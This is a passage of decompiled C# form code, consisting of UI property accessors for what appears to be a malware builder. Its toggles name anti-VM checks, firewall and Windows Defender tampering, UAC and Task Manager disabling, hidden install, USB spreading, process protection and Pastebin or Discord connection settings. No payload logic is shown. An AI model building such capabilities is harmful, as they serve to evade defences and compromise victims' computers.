		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_1;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_1 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel2
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_2;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_2 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel1
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_3;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_3 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel7
	{
		[CompilerGenerated]
		get
		{
			return vRcYfnFcaE;
		}
		[CompilerGenerated]
		set
		{
			vRcYfnFcaE = value;
		}
	}

	internal virtual Guna2TextBox Rndm
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_6;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_86;
			Guna2TextBox guna2TextBox = guna2TextBox_6;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconLeftClick -= value2;
			}
			guna2TextBox_6 = value;
			guna2TextBox = guna2TextBox_6;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconLeftClick += value2;
			}
		}
	}

	public virtual PictureBox PictureBox35
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_16;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_16 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Add_Firewall
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_2;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_2 = value;
		}
	}

	public virtual PictureBox PictureBox37
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_17;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_17 = value;
		}
	}

	internal virtual Guna2ToggleSwitch TurnOff_Firewall
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_3;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_3 = value;
		}
	}

	internal virtual Label Label54
	{
		[CompilerGenerated]
		get
		{
			return label_29;
		}
		[CompilerGenerated]
		set
		{
			label_29 = value;
		}
	}

	public virtual Guna2DragControl Guna2DragControl1
	{
		[CompilerGenerated]
		get
		{
			return guna2DragControl_0;
		}
		[CompilerGenerated]
		set
		{
			guna2DragControl_0 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel5
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_4;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_4 = value;
		}
	}

	internal virtual RadioButton Pastebin
	{
		[CompilerGenerated]
		get
		{
			return radioButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_83;
			RadioButton radioButton = radioButton_0;
			if (radioButton != null)
			{
				radioButton.CheckedChanged -= value2;
			}
			radioButton_0 = value;
			radioButton = radioButton_0;
			if (radioButton != null)
			{
				radioButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual RadioButton IPDNS
	{
		[CompilerGenerated]
		get
		{
			return radioButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_82;
			RadioButton radioButton = radioButton_1;
			if (radioButton != null)
			{
				radioButton.CheckedChanged -= value2;
			}
			radioButton_1 = value;
			radioButton = radioButton_1;
			if (radioButton != null)
			{
				radioButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2GradientButton Add_Socket
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_84;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	public virtual PictureBox PictureBox33
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_18;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_18 = value;
		}
	}

	public virtual Label Label22
	{
		[CompilerGenerated]
		get
		{
			return label_30;
		}
		[CompilerGenerated]
		set
		{
			label_30 = value;
		}
	}

	public virtual PictureBox PictureBox15
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_19;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_19 = value;
		}
	}

	public virtual Label Label46
	{
		[CompilerGenerated]
		get
		{
			return label_31;
		}
		[CompilerGenerated]
		set
		{
			label_31 = value;
		}
	}

	internal virtual Guna2TextBox Num_Delay
	{
		[CompilerGenerated]
		get
		{
			return hmlYtAapSQ;
		}
		[CompilerGenerated]
		set
		{
			KeyPressEventHandler value2 = method_87;
			Guna2TextBox guna2TextBox = hmlYtAapSQ;
			if (guna2TextBox != null)
			{
				guna2TextBox.KeyPress -= value2;
			}
			hmlYtAapSQ = value;
			guna2TextBox = hmlYtAapSQ;
			if (guna2TextBox != null)
			{
				guna2TextBox.KeyPress += value2;
			}
		}
	}

	internal virtual Guna2TextBox Discord_URL
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_7;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_7 = value;
		}
	}

	public virtual PictureBox PictureBox30
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_20;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_20 = value;
		}
	}

	internal virtual Label Label45
	{
		[CompilerGenerated]
		get
		{
			return label_32;
		}
		[CompilerGenerated]
		set
		{
			label_32 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Discord
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_4;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_88;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_4;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_4 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_4;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	public virtual PictureBox PictureBox32
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_21;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_21 = value;
		}
	}

	internal virtual Label Label47
	{
		[CompilerGenerated]
		get
		{
			return label_33;
		}
		[CompilerGenerated]
		set
		{
			label_33 = value;
		}
	}

	public virtual PictureBox PictureBox34
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_22;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_22 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Delay
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_5;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_85;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_5;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_5 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_5;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2ToggleSwitch Encrypt_ifo
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_6;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_6 = value;
		}
	}

	internal virtual Label Label48
	{
		[CompilerGenerated]
		get
		{
			return label_34;
		}
		[CompilerGenerated]
		set
		{
			label_34 = value;
		}
	}

	public virtual Label Label52
	{
		[CompilerGenerated]
		get
		{
			return label_35;
		}
		[CompilerGenerated]
		set
		{
			label_35 = value;
		}
	}

	public virtual PictureBox PictureBox23
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_23;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_23 = value;
		}
	}

	protected internal virtual ListView ListView_Socket
	{
		[CompilerGenerated]
		get
		{
			return listView_2;
		}
		[CompilerGenerated]
		set
		{
			listView_2 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel9
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_5;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_5 = value;
		}
	}

	public virtual PictureBox PictureBox42
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_24;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_24 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Stxt
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_7;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_94;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_7;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_7 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_7;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label61
	{
		[CompilerGenerated]
		get
		{
			return label_36;
		}
		[CompilerGenerated]
		set
		{
			label_36 = value;
		}
	}

	public virtual PictureBox PictureBox39
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_25;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_25 = value;
		}
	}

	public virtual Label Label53
	{
		[CompilerGenerated]
		get
		{
			return label_37;
		}
		[CompilerGenerated]
		set
		{
			label_37 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Sexe
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_8;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_93;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_8;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_8 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_8;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	public virtual PictureBox PictureBox29
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_26;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_26 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Srar
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_9;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_95;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_9;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_9 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_9;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label15
	{
		[CompilerGenerated]
		get
		{
			return label_38;
		}
		[CompilerGenerated]
		set
		{
			label_38 = value;
		}
	}

	public virtual PictureBox PictureBox36
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_27;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_27 = value;
		}
	}

	public virtual Label Label37
	{
		[CompilerGenerated]
		get
		{
			return label_39;
		}
		[CompilerGenerated]
		set
		{
			label_39 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Szip
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_10;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_96;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_10;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_10 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_10;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel6
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_6;
		}
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = method_89;
			Guna2GradientPanel guna2GradientPanel = guna2GradientPanel_6;
			if (guna2GradientPanel != null)
			{
				guna2GradientPanel.Paint -= value2;
			}
			guna2GradientPanel_6 = value;
			guna2GradientPanel = guna2GradientPanel_6;
			if (guna2GradientPanel != null)
			{
				guna2GradientPanel.Paint += value2;
			}
		}
	}

	internal virtual Guna2Separator Guna2Separator1
	{
		[CompilerGenerated]
		get
		{
			return guna2Separator_0;
		}
		[CompilerGenerated]
		set
		{
			guna2Separator_0 = value;
		}
	}

	public virtual PictureBox PictureBox24
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_28;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_28 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Run_Explorer
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_11;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_11 = value;
		}
	}

	internal virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_40;
		}
		[CompilerGenerated]
		set
		{
			label_40 = value;
		}
	}

	public virtual PictureBox PictureBox54
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_29;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_29 = value;
		}
	}

	public virtual PictureBox PictureBox55
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_30;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_30 = value;
		}
	}

	public virtual PictureBox PictureBox53
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_31;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_31 = value;
		}
	}

	public virtual PictureBox PictureBox52
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_32;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_32 = value;
		}
	}

	public virtual PictureBox PictureBox43
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_33;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_33 = value;
		}
	}

	internal virtual Guna2ToggleSwitch USB
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_12;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_12 = value;
		}
	}

	internal virtual Label Label62
	{
		[CompilerGenerated]
		get
		{
			return label_41;
		}
		[CompilerGenerated]
		set
		{
			label_41 = value;
		}
	}

	public virtual PictureBox PictureBox38
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_34;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_34 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Create_lnk
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_13;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_13 = value;
		}
	}

	internal virtual Label Label49
	{
		[CompilerGenerated]
		get
		{
			return label_42;
		}
		[CompilerGenerated]
		set
		{
			label_42 = value;
		}
	}

	public virtual PictureBox PictureBox40
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_35;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_35 = value;
		}
	}

	public virtual Label Label57
	{
		[CompilerGenerated]
		get
		{
			return label_43;
		}
		[CompilerGenerated]
		set
		{
			label_43 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Auto_Startup
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_14;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_91;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_14;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_14 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_14;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	public virtual PictureBox PictureBox41
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_36;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_36 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Create_vbs
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_15;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_92;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_15;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_15 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_15;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label58
	{
		[CompilerGenerated]
		get
		{
			return label_44;
		}
		[CompilerGenerated]
		set
		{
			label_44 = value;
		}
	}

	public virtual PictureBox PictureBox44
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_37;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_37 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Rotk
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_16;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_16 = value;
		}
	}

	internal virtual Label Label63
	{
		[CompilerGenerated]
		get
		{
			return label_45;
		}
		[CompilerGenerated]
		set
		{
			label_45 = value;
		}
	}

	public virtual PictureBox PictureBox45
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_38;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_38 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Run_UAC
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_17;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_17 = value;
		}
	}

	internal virtual Label Label64
	{
		[CompilerGenerated]
		get
		{
			return label_46;
		}
		[CompilerGenerated]
		set
		{
			label_46 = value;
		}
	}

	public virtual PictureBox PictureBox46
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_39;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_39 = value;
		}
	}

	public virtual Label Label65
	{
		[CompilerGenerated]
		get
		{
			return label_47;
		}
		[CompilerGenerated]
		set
		{
			label_47 = value;
		}
	}

	internal virtual Guna2ToggleSwitch UAC
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_18;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_90;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_18;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_18 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_18;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	public virtual PictureBox PictureBox47
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_40;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_40 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Hide_install
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_19;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_19 = value;
		}
	}

	internal virtual Label Label66
	{
		[CompilerGenerated]
		get
		{
			return label_48;
		}
		[CompilerGenerated]
		set
		{
			label_48 = value;
		}
	}

	public virtual PictureBox PictureBox57
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_41;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_41 = value;
		}
	}

	internal virtual Guna2ToggleSwitch AntiVM
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_20;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_20 = value;
		}
	}

	internal virtual Guna2ToggleSwitch h_file
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_21;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_21 = value;
		}
	}

	internal virtual Label Label67
	{
		[CompilerGenerated]
		get
		{
			return label_49;
		}
		[CompilerGenerated]
		set
		{
			label_49 = value;
		}
	}

	public virtual Label Label68
	{
		[CompilerGenerated]
		get
		{
			return label_50;
		}
		[CompilerGenerated]
		set
		{
			label_50 = value;
		}
	}

	public virtual PictureBox PictureBox58
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_42;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_42 = value;
		}
	}

	public virtual PictureBox PictureBox59
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_43;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_43 = value;
		}
	}

	public virtual Label Label69
	{
		[CompilerGenerated]
		get
		{
			return label_51;
		}
		[CompilerGenerated]
		set
		{
			label_51 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Protect_Process
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_22;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_22 = value;
		}
	}

	public virtual PictureBox PictureBox56
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_44;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_44 = value;
		}
	}

	public virtual PictureBox PictureBox48
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_45;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_45 = value;
		}
	}

	internal virtual Panel Panel11
	{
		[CompilerGenerated]
		get
		{
			return panel_26;
		}
		[CompilerGenerated]
		set
		{
			panel_26 = value;
		}
	}

	public virtual PictureBox PictureBox51
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_46;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_46 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Protect_Spreading
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_23;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_23 = value;
		}
	}

	public virtual Label Label73
	{
		[CompilerGenerated]
		get
		{
			return label_52;
		}
		[CompilerGenerated]
		set
		{
			label_52 = value;
		}
	}

	public virtual PictureBox PictureBox50
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_47;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_47 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Protect_Startup
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_24;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_24 = value;
		}
	}

	public virtual Label Label72
	{
		[CompilerGenerated]
		get
		{
			return label_53;
		}
		[CompilerGenerated]
		set
		{
			label_53 = value;
		}
	}

	public virtual PictureBox PictureBox49
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_48;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_48 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Protect_Install
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_25;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_25 = value;
		}
	}

	public virtual Label Label71
	{
		[CompilerGenerated]
		get
		{
			return label_54;
		}
		[CompilerGenerated]
		set
		{
			label_54 = value;
		}
	}

	internal virtual Label Label70
	{
		[CompilerGenerated]
		get
		{
			return label_55;
		}
		[CompilerGenerated]
		set
		{
			label_55 = value;
		}
	}

	public virtual PictureBox PictureBox60
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_49;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_49 = value;
		}
	}

	internal virtual Guna2ToggleSwitch MSG
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_26;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_26 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel10
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_7;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_7 = value;
		}
	}

	public virtual PictureBox PictureBox69
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_50;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_50 = value;
		}
	}

	public virtual PictureBox PictureBox17
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_51;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_51 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Kill_Process
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_27;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_101;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_27;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_27 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_27;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label51
	{
		[CompilerGenerated]
		get
		{
			return label_56;
		}
		[CompilerGenerated]
		set
		{
			label_56 = value;
		}
	}

	internal virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return label_57;
		}
		[CompilerGenerated]
		set
		{
			label_57 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Delete_SRS
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_28;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_28 = value;
		}
	}

	internal virtual Label Label75
	{
		[CompilerGenerated]
		get
		{
			return label_58;
		}
		[CompilerGenerated]
		set
		{
			label_58 = value;
		}
	}

	public virtual PictureBox PictureBox64
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_52;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_52 = value;
		}
	}

	internal virtual Guna2ToggleSwitch WD_exception
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_29;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_138;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_29;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_29 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_29;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label77
	{
		[CompilerGenerated]
		get
		{
			return label_59;
		}
		[CompilerGenerated]
		set
		{
			label_59 = value;
		}
	}

	public virtual PictureBox PictureBox67
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_53;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_53 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Disable_Hide
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_30;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_30 = value;
		}
	}

	internal virtual Guna2GradientPanel Tab_Process
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_8;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_8 = value;
		}
	}

	protected internal virtual ListView Listkill
	{
		[CompilerGenerated]
		get
		{
			return listView_3;
		}
		[CompilerGenerated]
		set
		{
			listView_3 = value;
		}
	}

	public virtual PictureBox PictureBox61
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_54;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_54 = value;
		}
	}

	public virtual Label Label74
	{
		[CompilerGenerated]
		get
		{
			return label_60;
		}
		[CompilerGenerated]
		set
		{
			label_60 = value;
		}
	}

	internal virtual Guna2GradientButton Guna2GradientButton1
	{
		[CompilerGenerated]
		get
		{
			return xbruEkvjBZ;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_102;
			Guna2GradientButton guna2GradientButton = xbruEkvjBZ;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			xbruEkvjBZ = value;
			guna2GradientButton = xbruEkvjBZ;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2TextBox List_Kill
	{
		[CompilerGenerated]
		get
		{
			return YlUuWsehjr;
		}
		[CompilerGenerated]
		set
		{
			YlUuWsehjr = value;
		}
	}

	public virtual PictureBox PictureBox68
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_55;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_55 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Disable_Control
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_31;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_31 = value;
		}
	}

	public virtual PictureBox PictureBox62
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_56;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_56 = value;
		}
	}

	public virtual PictureBox PictureBox63
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_57;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_57 = value;
		}
	}

	internal virtual Label Label76
	{
		[CompilerGenerated]
		get
		{
			return label_61;
		}
		[CompilerGenerated]
		set
		{
			label_61 = value;
		}
	}

	internal virtual Label Label50
	{
		[CompilerGenerated]
		get
		{
			return okDuDeshj7;
		}
		[CompilerGenerated]
		set
		{
			okDuDeshj7 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Disable_Task
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_32;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_32 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Disable_UAC
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_33;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_33 = value;
		}
	}

	public virtual PictureBox PictureBox66
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_58;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_58 = value;
		}
	}

